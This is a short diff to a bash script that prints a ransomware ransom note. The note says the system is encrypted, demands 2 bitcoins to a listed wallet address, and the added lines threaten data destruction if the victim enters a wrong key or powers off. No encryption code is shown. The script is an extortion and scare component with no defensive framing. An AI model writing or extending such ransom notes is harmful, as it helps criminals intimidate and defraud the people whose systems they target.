@@ -1,5 +1,8 @@
 #!/bin/bash
 echo "YOUR SYSTEM IS ENCRYPTED!"
+echo "YOU ARE VICTIM OF RANSOMWARE ATTACK, SO YOUR PERSONAL DATA IS ENCRYPTED"
+echo "IF YOU INSERT THE WRONG KEY, OR TURN OFF THE SYSTEM YOUR DATA CAN BE DESTROYED"
+echo "-------------------------------------------------------------------------------"
 echo "If you want your data back, send 2 bitcoins to this address:"
 echo "bc1qvpwfav9y0xgt74ukrgru8hfu6hpuk7p8ppps2v"
 
